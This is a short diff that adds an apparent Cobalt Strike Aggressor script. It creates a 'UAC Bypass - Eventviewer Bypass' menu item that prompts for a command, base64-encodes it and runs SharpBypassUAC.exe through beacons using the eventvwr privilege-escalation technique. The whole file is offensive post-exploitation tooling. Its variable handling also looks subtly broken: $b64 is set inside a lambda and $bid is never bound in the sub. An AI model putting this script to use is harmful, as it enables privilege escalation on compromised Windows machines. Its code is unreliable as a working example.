@@ -1,0 +1,14 @@
+item "UAC Bypass - Eventviewer Bypass"{
+	local('$bid');
+		foreach $bid ($1){
+			eventvwr_bypass($bid);
+		}
+	}
+
+
+sub eventvwr_bypass{
+prompt_text("Enter A Command:", "", lambda({ 
+$b64 = base64_encode("$1")
+}))
+bexecute_assembly($bid, script_resource('exe/SharpBypassUAC.exe'),"-b eventvwr -e $b64"); 
+}
